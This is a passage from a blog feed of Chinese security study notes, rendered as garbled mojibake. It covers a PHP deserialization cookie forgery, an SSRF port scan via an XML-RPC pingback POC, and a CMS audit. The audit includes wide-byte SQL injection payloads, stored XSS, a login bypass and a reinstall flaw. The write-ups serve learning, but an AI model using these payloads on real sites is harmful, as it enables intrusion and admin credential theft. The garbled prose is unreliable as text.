å¯†)</code><br><code>$m=a:1:{i:0;O:6:&quot;readme&quot;:1:{s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;}}</code><br><code>md5($m)=e2d4f7dcc43ee1db7f69e76303d0105c</code></p><p>æ‰€ä»¥æœ€åæ‰€ç”Ÿæˆcookieä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">todos=&gt;e2d4f7dcc43ee1db7f69e76303d0105ca:1:&#123;i:0;O:6:&quot;readme&quot;:1:&#123;s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºç”Ÿæˆcookieä¼šä¸»åŠ¨è¿›è¡Œä¸€æ¬¡urlç¼–ç ï¼Œç„¶åå­˜å‚¨åä¼šè¿›è¡Œä¸€æ¬¡urlè§£ç ï¼Œå› ä¸ºæˆ‘ä»¬æ‰‹åŠ¨ç”Ÿæˆcookieï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è¿›è¡Œä¸€æ¬¡urlç¼–ç ï¼Œå†å°†å…¶æ”¾åˆ°cookieä¸­å»<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0ydiyo7j31hc0ipjwd.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0yuvdqej31ax0crwig.jpg" alt><br>å°†å…¶æ”¾å…¥cookieä¸­ï¼Œåˆ·æ–°ï¼ŒæˆåŠŸæ‹¿åˆ°flagï¼›<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0zpxd5ej31hc0h6q4a.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF-æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ </title>
      <link href="/2019/12/07/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
      <url>/2019/12/07/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯SSRF"><a href="#ä»€ä¹ˆæ˜¯SSRF" class="headerlink" title="ä»€ä¹ˆæ˜¯SSRF?"></a>ä»€ä¹ˆæ˜¯SSRF?</h1><p>SSRF(Server-Side Request Forgery:<strong>æœåŠ¡å™¨ç«¯</strong>è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ˜¯è¦ç›®æ ‡ç½‘ç«™çš„<strong>å†…éƒ¨ç³»ç»Ÿ</strong>ã€‚ï¼ˆå› ä¸ºä»–æ˜¯ä»å†…éƒ¨ç³»ç»Ÿè®¿é—®çš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å®ƒæ”»å‡»å¤–ç½‘æ— æ³•è®¿é—®çš„<strong>å†…éƒ¨ç³»ç»Ÿ(å³å†…ç½‘)</strong>ï¼Œä¹Ÿå°±æ˜¯æŠŠç›®æ ‡ç½‘ç«™å½“ä¸­é—´äºº;å³<strong>åˆ©ç”¨ä¸€ä¸ªå¯å‘èµ·ç½‘ç»œè¯·æ±‚çš„æœåŠ¡å½“åšè·³æ¿æ¥æ”»å‡»å…¶ä»–æœåŠ¡;</strong></p><p>é€šä¿—çš„è¯´å°±æ˜¯æµè§ˆå™¨å»è®¿é—®æœåŠ¡éƒ½æ˜¯é€šè¿‡æµè§ˆå™¨æœ¬åœ°å»è®¿é—®çš„ï¼Œè€ŒSSRFå°±æ˜¯æ”»å‡»è€…é€šè¿‡å‘½ä»¤æœåŠ¡å™¨ç«¯å»è®¿é—®å¦ä¸€ä¸ªæœåŠ¡ï¼Œ<strong>æœåŠ¡å™¨ç«¯å»è®¿é—®</strong>å¹¶è¿”å›äº†è®¿é—®æ•°æ®</p><h2 id="SSRFåŸç†è¯¦è§£"><a href="#SSRFåŸç†è¯¦è§£" class="headerlink" title="SSRFåŸç†è¯¦è§£"></a>SSRFåŸç†è¯¦è§£</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬è¦å¯¹ç›®æ ‡ç½‘ç«™çš„æ¶æ„äº†è§£ï¼Œè„‘å­äº†è¦æœ‰ä¸€ä¸ªæ¶æ„å›¾ã€‚æ¯”å¦‚ ï¼š Aç½‘ç«™ï¼Œæ˜¯ä¸€ä¸ªæ‰€æœ‰äººéƒ½å¯ä»¥è®¿é—®çš„å¤–ç½‘ç½‘ç«™å¹¶å¯ä»¥å‘èµ·ç½‘ç»œè¯·æ±‚ï¼ŒBç½‘ç«™æ˜¯ä¸€ä¸ªä»–ä»¬å†…éƒ¨çš„OAç½‘ç«™ã€‚</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬æ™®é€šç”¨æˆ·åªå¯ä»¥è®¿é—®aç½‘ç«™ï¼Œä¸èƒ½è®¿é—®bç½‘ç«™ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡aç½‘ç«™åšä¸­é—´äººï¼Œ<strong>è®©aç½‘ç«™å»ä»£æ›¿æˆ‘ä»¬å»è®¿é—®bç½‘ç«™ï¼Œå¹¶è¿”å›æ•°æ®ï¼Œ</strong>ä»è€Œè¾¾åˆ°æ”»å‡»bç½‘ç«™éœ€æ±‚ã€‚é‚£å¦‚æœbç½‘ç«™æ˜¯ä¸ªå†…ç½‘ç½‘ç«™ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥å»é€šè¿‡aç½‘ç«™è¿›å…¥<strong>æ”»å‡»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…ç½‘ç³»ç»Ÿ</strong>ï¼Œæ”»å‡»æ‰€åœ¨å†…ç½‘ä¸­ç½‘ç«™ã€ç¨‹åºï¼›</p><h2 id="SSRFçš„ä½œç”¨"><a href="#SSRFçš„ä½œç”¨" class="headerlink" title="SSRFçš„ä½œç”¨"></a>SSRFçš„ä½œç”¨</h2><ul><li>æ‰«æå†…éƒ¨ç½‘ç»œ(FingerPrint)(å¯¹è¾“å…¥è¿æ¥æ²¡æœ‰é™åˆ¶ï¼Œå¯ä»¥ç›´é€šå†…ç½‘)</li><li>å‘<strong>å†…éƒ¨</strong>ä¸»æœºçš„<strong>ä»»æ„ä¸»æœº</strong>çš„<strong>ä»»æ„ç«¯å£</strong>å‘é€æˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„æ•°æ®è¡¨(payload)</li><li>DDOS(è¯·æ±‚å¤§æ–‡ä»¶ï¼Œå§‹ç»ˆä¿æŒè¿æ¥Keep-Alive Alway)</li><li>æš´åŠ›ç©·ä¸¾(users/dirs/files)</li><li>å†…å¤–ç½‘Webç«™ç‚¹æ¼æ´çš„åˆ©ç”¨(æ¯”å¦‚å†…ç½‘ç½‘ç«™å­˜åœ¨sqlæ³¨å…¥ï¼Œå› ä¸ºæ˜¯å†…ç½‘ï¼Œç½‘ç«™ç®¡ç†å‘˜é˜²èŒƒæ„è¯†è¾ƒä½ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å­˜åœ¨æ¼æ´è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„)</li><li>å†…å¤–ç½‘ä¸»æœºåº”ç”¨ç¨‹åºæ¼æ´çš„åˆ©ç”¨</li></ul><p>##é¶åœºå®æˆ˜<br>æˆ‘ä»¬è¿›å…¥é¶åœº<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3e2wptko9j31h90fyglw.jpg" alt><br>å‘ç°è®¿é—®çš„æ˜¯ä¸€ä¸ªxmlrpcæœåŠ¡ï¼Œä½†è¯¥æœåŠ¡<strong>åªæ¥å—POSTè¯·æ±‚</strong>ï¼›æˆ‘ä»¬å‘ç°è¿™æ˜¯ä¸€ä¸ªtypeechoçš„CMS,è¿™ä¸ªCMSæ˜¯é»˜è®¤å¼€å¯äº†XMLRPCæœåŠ¡çš„</p><p><strong>XML RPC</strong><br>(XML-RPCæ˜¯ä¸€ä¸ªè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆè¿œç«¯ç¨‹åºå‘¼å«ï¼‰ï¼ˆremote procedure callï¼ŒRPC)çš„åˆ†å¸ƒå¼è®¡ç®—åè®®ï¼Œé€šè¿‡XMLå°†è°ƒç”¨å‡½æ•°å°è£…ï¼Œå¹¶ä½¿ç”¨httpåè®®åšä¸ºä¼ è¾“åè®®çš„rpcæœºåˆ¶ï¼Œä½¿ç”¨xmlæ–‡æœ¬çš„æ–¹å¼ä¼ è¾“å‘½ä»¤å’Œæ•°æ®ã€‚)</p><p>XMLRPCä¸­æœ‰ä¸€ä¸ªå«åšpingbackåè®®(pingback,<strong>é€šçŸ¥ç½‘å¿—ç³»ç»Ÿæ–‡ç« è¢«å¼•ç”¨</strong>æƒ…å†µçš„ä¸€ç§æ‰‹æ®µ)ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼›</p><p>POCå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line"> &lt;methodName&gt;pingback.ping&lt;/methodName&gt;</span><br><span class="line"> &lt;params&gt;</span><br><span class="line">    &lt;string&gt;http://127.0.0.1:1&lt;/string&gt;</span><br><span class="line"> &lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure><p>é€šè¿‡åˆ·æ–°æŠ“åŒ…ï¼Œå°†è¯·æ±‚æ–¹å¼ä¿®æ”¹ä¸ºPOSTæ–¹å¼ï¼Œå¹¶å°†pocä»£ç æ”¾åˆ°ä¸‹é¢<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3e4norujuj30z40qf40e.jpg" alt><br>è¿™æ®µpocè¯´ç®€å•ç‚¹ï¼Œå°±æ˜¯ä»–ä¼šé€šè¿‡æœåŠ¡å™¨ç«¯å»pingå†…ç½‘çš„åœ°å€ï¼Œå¹¶è¿”å›ä¿¡æ¯ï¼Œé€šè¿‡è¿”å›ä¿¡æ¯çŸ¥é“ç«¯å£çš„å¼€æ”¾ã€‚<br>ç”±äºæˆ‘ä»¬ä¸çŸ¥é“å¼€æ”¾ç«¯å£ï¼Œæ‰€ä»¥é€šè¿‡burpè¿›è¡Œç«¯å£çˆ†ç ´<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3e4o051cyj30z40ouq6c.jpg" alt><br>å‘ç°å¼€æ”¾äº†ä¸¤ä¸ªç«¯å£ï¼Œæˆ‘ä»¬é€šè¿‡æç¤ºçŸ¥é“äº†å†…ç½‘88ç«¯å£æ˜ å°„12388ç«¯å£,<br>æˆ‘ä»¬å¯¹12388ç«¯å£è¿›è¡Œè®¿é—®ï¼ŒæŠ“åŒ…çœ‹è¿”å›å¤´ï¼Œå¾—åˆ°flag<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3e4oa3liaj30z40ovju0.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlæ³¨å…¥--0dayå®¡è®¡æ¡ˆä¾‹(äºŒ)</title>
      <link href="/2019/12/07/sql%E6%B3%A8%E5%85%A5--0day%E5%AE%A1%E8%AE%A1%E6%A1%88%E4%BE%8B(2)/"/>
      <url>/2019/12/07/sql%E6%B3%A8%E5%85%A5--0day%E5%AE%A1%E8%AE%A1%E6%A1%88%E4%BE%8B(2)/</url>
      
        <content type="html"><![CDATA[<p>æˆ‘ä»¬å¼€å§‹è¿›è¡Œä»£ç å®¡è®¡ã€æ¼æ´æŒ–æ˜</p><h3 id="ç½‘ç«™é‡è£…æ¼æ´"><a href="#ç½‘ç«™é‡è£…æ¼æ´" class="headerlink" title="ç½‘ç«™é‡è£…æ¼æ´"></a>ç½‘ç«™é‡è£…æ¼æ´</h3><p>ä¸€èˆ¬æˆ‘è¦åšä¸€ä¸ªCMSç½‘ç«™ï¼Œé¦–å…ˆè¦è®¿é—®ç›®å½•ä¸­çš„å®‰è£…ç›®å½•ï¼Œè¿›è¡Œå®‰è£…ã€æ³¨å†Œç®¡ç†å‘˜è´¦å·ã€‚é‚£æˆ‘ä»¬ç«™åœ¨é»‘å®¢è§’åº¦ä¸Šæƒ³ä¸€æƒ³ï¼Œæˆ‘ä»¬å¦‚æœçŸ¥é“äº†ä¸€ä¸ªcmsçš„å®‰è£…ç›®å½•è·¯å¾„ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯èƒ½è¿›è¡ŒäºŒæ¬¡è®¿é—®è¿›è¡Œé‡æ–°å®‰è£…å‘¢ï¼Ÿè¿™æ ·çš„è¯æˆ‘ä»¬æ˜¯ä¸æ˜¯å°±å¯ä»¥é‡ç½®ç®¡ç†å‘˜è´¦å·å’Œå¯†ç ï¼Œç™»å…¥åå°è¿›è¡Œgetshellå‘¢ï¼Ÿ<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418sjhanvj31h60rbwgy.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418t83yofj31h90pwdj9.jpg" alt><br>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œé‡æ–°å®‰è£…äº†ï¼Œè€Œæ•°æ®åº“è´¦å·å¯†ç ï¼Œæˆ‘ä»¬å¯ä»¥å¼„ä¸€ä¸ªè™šæ‹Ÿç©ºé—´æ•°æ®åº“ï¼Œæ¯”å¦‚æ³¨å…¥æ—¶ç”¨åˆ°çš„é¦™æ¸¯äº‘ã€‚</p><h3 id="XSSè·¨ç«™è„šæœ¬æ”»å‡»"><a href="#XSSè·¨ç«™è„šæœ¬æ”»å‡»" class="headerlink" title="XSSè·¨ç«™è„šæœ¬æ”»å‡»"></a>XSSè·¨ç«™è„šæœ¬æ”»å‡»</h3><p>æˆ‘ä»¬å†æ¥çœ‹è¿™ä¸ªç½‘ç«™ï¼Œä¸€èˆ¬è€Œè¨€ç½‘ç«™æœ‰å±•ç¤ºç±»å’ŒåŠŸèƒ½ç±»ã€‚</p><p>å±•ç¤ºç±»ï¼ˆæ¯”å¦‚æ–°é—»ç«™ã€é—¨æˆ·ç«™ï¼‰</p><p>åŠŸèƒ½ç±»ï¼ˆæ¯”å¦‚å•†åŸã€OAã€ç³»ç»Ÿï¼‰</p><p>æˆ‘ä»¬çœ‹åˆ°å‰å°æœ‰ä¸€ä¸ªæ³¨å†ŒåŠŸèƒ½ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ‹¿åˆ°ä¸€ä¸ªæ™®é€šç”¨æˆ·çš„æƒé™æ˜¯ä¸æ˜¯æ›´åŠ å®¹æ˜“æ¸—é€æµ‹è¯•ï¼Ÿæµ‹è¯•çš„ç‚¹æ˜¯ä¸æ˜¯æ›´å¤šï¼Ÿ<br>é‚£ä¹ˆæˆ‘ä»¬å»æ³¨å†Œä¸€ä¸ªè´¦æˆ·å§ï¼<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418thvsawj31h80osac3.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418tqqwkwj31h60qkdi5.jpg" alt><br>åœ¨æ³¨å†Œä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå¼€ä¸‹burpï¼Œçœ‹ä¸‹æäº¤æ³¨å†Œçš„æ•°æ®åŒ…å‘å¾€å“ªé‡Œå»<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418u2kpw2j31gj0qhq6z.jpg" alt><br>å‘ç°å®ƒé€šè¿‡postæ–¹å¼å°†å‚æ•°å‘é€user.php ,æˆ‘ä»¬æ³¨æ„åˆ°é‡Œé¢æœ‰actä¼ è¿›å‚æ•°do_reg,æˆ‘ä»¬é€šè¿‡ä»£ç å®¡è®¡å·¥å…·æ‰¾åˆ°user.php<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418ub5ui9j31hc0sgk2s.jpg" alt><br>æˆ‘ä»¬å‘ç°è¿™é‡Œæ˜¯æ£€æŸ¥ä¼ è¿›æ¥çš„æ³¨å†Œå‚æ•°æ˜¯å¦ä¸ºç©ºå’Œæœ‰æ²¡æœ‰ç©ºæ ¼ï¼Œå¹¶ä¸”åŠ å…¥ä¸€äº›æ£€æŸ¥æ ¼å¼<br>è€Œæˆ‘ä»¬åœ¨ä¸‹é¢å‘ç°sqlæ’å…¥è¯­å¥<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418uije5fj313b0i4tdu.jpg" alt><br>å‘ç°å®ƒå¹¶æ²¡æœ‰å°†æ³¨å†Œçš„å€¼è¿›è¡Œè¿‡æ»¤ï¼Œè€Œç›´æ¥æ’å…¥æ•°æ®åº“ä¸­ã€‚é‚£ä¹ˆè¿™å°±å¾ˆæœ‰å¯èƒ½å­˜åœ¨XSSå’Œsqlæ³¨å…¥ã€‚</p><p>æˆ‘ä»¬å…ˆé€šè¿‡ä¸€ä¸ªå¼¹çª—çœ‹çœ‹æ˜¯å¦æœ‰xssï¼Œå…ˆæŠ“ä¸€ä¸ªåŒ…ï¼Œå¹¶å¯¹å…¶é‚®ç®±è¿›è¡Œæ’å…¥å¼¹çª—è¯­å¥<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418uxubm8j30z40rkq4p.jpg" alt><br>æˆåŠŸå¼¹çª—ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªå­˜å‚¨å‹çš„XSSã€‚<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418wavb2qj31h80pqjt2.jpg" alt></p><h3 id="sqlæ³¨å…¥æ¼æ´"><a href="#sqlæ³¨å…¥æ¼æ´" class="headerlink" title="sqlæ³¨å…¥æ¼æ´"></a>sqlæ³¨å…¥æ¼æ´</h3><p>åœ¨æ’å…¥è¯­å¥ä¸­<br><code>&quot;INSERT INTO &quot;.table(&#39;user&#39;).&quot; (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&#39;&#39;, &#39;$user_name&#39;, md5(&#39;$pwd&#39;), &#39;$email&#39;, &#39;$timestamp&#39;, &#39;$timestamp&#39;)&quot;;</code><br>è¿™é‡Œæ’å…¥æ²¡æœ‰è¿‡æ»¤ï¼Œç”±äºemailå˜é‡ç”±ä¸€å¯¹å•å¼•å·åŒ…ç€ï¼Œæ‰€ä»¥æˆ‘ä»¬è¯•ç€åœ¨é‚®ç®±åé¢åŠ ä¸ªâ€™,çœ‹çœ‹æ˜¯å¦ä¼šæŠ¥é”™<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418wjbjauj30z40rkmyy.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418wjbjauj30z40rkmyy.jpg" alt><br>å‘ç°è¿˜æ˜¯æ³¨å†ŒæˆåŠŸäº†ï¼Œé‚£æˆ‘ä»¬è¿›åå°çœ‹çœ‹<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418wxhl9tj30z50h1wfx.jpg" alt><br>å‘ç°â€™å¥½åƒè¢«å®ä½“åŒ–äº†ï¼Œå°±æ˜¯è¢«\è½¬ä¹‰äº†ï¼Œè¿™å¥½åƒæ˜¯phpé…ç½®ä¸­å¼€å¯äº†é­”æœ¯å¼•å·ï¼Œé‚£æˆ‘ä»¬åº”è¯¥æƒ³åˆ°ä¹‹å‰çš„å®½å­—èŠ‚æ³¨å…¥ï¼Œåœ¨å¼•å·å‰åŠ %dfï¼Œä½¿å…¶ä¸\%5cåˆå¹¶,ä»è€Œé¿å…â€™è¢«è½¬ä¹‰ã€‚<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418x765fgj30z40rktag.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418xeyzpej30z40rkjtw.jpg" alt><br>å‘ç°æŠ¥é”™äº†ï¼Œé‚£å°±è¯´æ˜å­˜åœ¨æ³¨å…¥<br>å°è¯•ä½¿ç”¨updatexmlçš„æŠ¥é”™<br>æ„å»ºä¸‹è¯­å¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO blue_user (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&apos;&apos;, &apos;allblue1234&apos;, md5(&apos;allblue1234&apos;), &apos;allblue1234@qq.comï¿½\&apos; or updatexml(1,concat(0x7e,(SELECT database())),1),1,1)#\&apos;&apos;, &apos;1560443115&apos;, &apos;1560443115&apos;)</span><br></pre></td></tr></table></figure><p>å‘ç°æŠ¥é”™ï¼Œæ²¡æœ‰æ˜¾ç¤ºæˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418xro0upj30z40rkacp.jpg" alt><br>ä½†æˆ‘å‘ç°æ”¾è¿›æ•°æ®åº“æ‰§è¡Œï¼Œå´èƒ½æˆåŠŸ(éœ€å°†%df\  å»æ‰)<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418xzi127j31560lgaeh.jpg" alt><br>é‚£æˆ‘ä»¬åªèƒ½é€šè¿‡ç›²æ³¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO blue_user (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&apos;&apos;, &apos;allblue1234&apos;, md5(&apos;allblue1234&apos;), &apos;allblue1234@qq.comï¿½\&apos; or sleep(10),1,1)#\&apos;&apos;, &apos;1560443115&apos;, &apos;1560443115&apos;)</span><br></pre></td></tr></table></figure></p><p>ä»¥è¿™ç§æ ¼å¼ç»§ç»­ç›²æ³¨ä¸‹å»ã€‚</p><p>ä½†æˆ‘ä»¬æƒ³åˆ°ï¼Œinsert into æ˜¯èƒ½æ’å…¥å¤šæ¡æ•°æ®å‘¢ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯èƒ½é€šè¿‡è¯­å¥æ„å»ºï¼Œå†å»ºç«‹ä¸€ä¸ªç”¨æˆ·ï¼Œç„¶åç”¨å­æŸ¥è¯¢å¡«å……é‚®ç®±å¤„ï¼Œç„¶åæˆ‘ä»¬ç™»é™†è¿™ä¸ªè´¦å·æ˜¯ä¸æ˜¯å°±å¯ä»¥çœ‹åˆ°é‚®ç®±å­—æ®µé‡Œé¢çš„å†…å®¹ï¼Ÿ<br>æˆ‘ä»¬å…ˆæŠ“åŒ…<br>è¿™æ ·å°±æ’å…¥äº†ä¸¤ç»„æ•°æ®ï¼Œè€Œåœ¨ç¬¬äºŒç»„æ•°æ®ä¸­çš„é‚®ç®±å°±æ˜¯ç®¡ç†å‘˜å¯†ç <br>æˆ‘ä»¬æ‰§è¡Œä¸€ä¸‹ï¼Œå‘ç°æ‰§è¡Œå¤±è´¥<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418ydsotkj30z40rktbf.jpg" alt><br>å› ä¸ºè¿™é‡Œé­”æœ¯å¼•å·ä¼šå°†å¼•å·è½¬ä¹‰ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨å®½å­—èŠ‚çŸ¥è¯†ï¼Œå°†å…¶è½¬ä¸º16è¿›åˆ¶ç¼–ç <br>allblue2019==&gt;0x616C6C626C756532303139<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418yodkozj30z40rkq6i.jpg" alt><br>æ³¨å†ŒæˆåŠŸï¼Œç™»å½•<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418yzxxk0j31gg0ovtaj.jpg" alt><br>å°†é‚®ç®±å€¼è¿›è¡Œmd5è§£å¯†ï¼ŒæˆåŠŸå¾—åˆ°ç®¡ç†å‘˜å¯†ç <br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418z7jwb3j31ha0ky3zn.jpg" alt></p><h3 id="ç™»å½•æ¡†ä¸‡èƒ½å¯†ç ç™»å½•"><a href="#ç™»å½•æ¡†ä¸‡èƒ½å¯†ç ç™»å½•" class="headerlink" title="ç™»å½•æ¡†ä¸‡èƒ½å¯†ç ç™»å½•"></a>ç™»å½•æ¡†ä¸‡èƒ½å¯†ç ç™»å½•</h3><p>æˆ‘ä»¬å°è¯•ç™»å½•æŠ“åŒ…<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418zidhbij30z40rk760.jpg" alt><br>æ‰¾åˆ°ä¼ å‚çš„ä½ç½®ï¼Œåœ¨å®¡è®¡å·¥å…·æŸ¥æ‰¾<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418zussp9j31hc0sm49l.jpg" alt><br>å‘ç°è¿™é‡Œåˆ¤æ–­äº†æ˜¯å¦ä¸ºç®¡ç†å‘˜ï¼Œæ²¡æœ‰å¯¹ç™»å½•å‚æ•°è¿›è¡Œé™åˆ¶ï¼Œè¿™å¯èƒ½å­˜åœ¨POSTæ³¨å…¥<br>postæ³¨å…¥ï¼Œé¦–å…ˆå°è¯•ç€ä½¿ç”¨ä¸‡èƒ½å¯†ç ç™»å½•<br><code>%df&#39;) or 1=1#</code><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g41902f5r4j30z40rkwg9.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4190a2wpfj31hb0i6aae.jpg" alt><br>æˆåŠŸç™»å½•<br>ç„¶åç™»å½•åä¿®æ”¹èµ„æ–™å¤„ä¹Ÿå­˜åœ¨SQLæ³¨å…¥å’ŒXSS</p><h3 id="X-Forwarded-Foræ³¨å…¥"><a href="#X-Forwarded-Foræ³¨å…¥" class="headerlink" title="X-Forwarded-Foræ³¨å…¥"></a>X-Forwarded-Foræ³¨å…¥</h3><p>æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªæ™®é€šç”¨æˆ·å‘å¸ƒäº†æ–°é—»<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4190jiyuoj31hc0lndhp.jpg" alt><br>é€šè¿‡é‡æ–°æ³¨å†Œä¸€ä¸ªç”¨æˆ·å¯¹å…¶è¿›è¡Œè¯„è®º<br>è¯„è®ºæˆåŠŸ<br>é‚£ä¹ˆè¿™å¯èƒ½ä¹Ÿå­˜åœ¨XSSã€‚<br>æˆ‘ä»¬è¯„è®ºæ—¶å…ˆæŠ“ä¸ªåŒ…çœ‹çœ‹<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4193ify2nj31hc0mlq4z.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4193tropfj30z40rkwgc.jpg" alt><br>å‘ç°ä»–ä¼šå°†å‚æ•°sendæäº¤åˆ°comment.php,é‚£ä¹ˆæˆ‘ä»¬å»çœ‹ä¸€çœ‹</p><p>æˆ‘ä»¬å‘ç°è¿™é‡Œé¢æœ‰ä¸€äº›å‡½æ•°<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4194117l1j31hc0sm116.jpg" alt></p><ul><li><p>intval()<br>intval() å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ã€‚<br>intval() å‡½æ•°é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡ var çš„ integer æ•°å€¼ã€‚ intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1ã€‚</p></li><li><p>htmlspecialchars()<br>æŠŠé¢„å®šä¹‰çš„å­—ç¬¦ â€œ&lt;â€ ï¼ˆå°äºï¼‰å’Œ â€œ&gt;â€ ï¼ˆå¤§äºï¼‰è½¬æ¢ä¸º HTML å®ä½“</p></li><li><p>nl2br()<br>åœ¨å­—ç¬¦ä¸²ä¸­çš„æ–°è¡Œï¼ˆ\nï¼‰ä¹‹å‰æ’å…¥æ¢è¡Œç¬¦<br>æ‰€ä»¥XSSè‚¯å®šæ˜¯æ²¡æˆäº†ã€‚</p></li></ul><p>è¿™æ—¶ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†ä»–åœ¨æ’å…¥çš„æ—¶å€™ï¼Œè®°å½•äº†è¯„è®ºç”¨æˆ·çš„ipï¼Œæˆ‘ä»¬å‘ç°äº†getipå‡½æ•°ï¼Œæˆ‘ä»¬å®šä½ä¸€ä¸‹å‡½æ•°<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4194argjyj31dy0q7n3k.jpg" alt><br>æ‰¾åˆ°äº†å®šä¹‰çš„å‡½æ•°ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªgetenvï¼Œå®é™…ä¸Šå°±æ˜¯è·å–ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡</p><p>ç¬¬ä¸€ä¸ªHTTP_CLIENT_IPè¿™ä¸ªç¯å¢ƒå˜é‡æ²¡æœ‰æˆæ 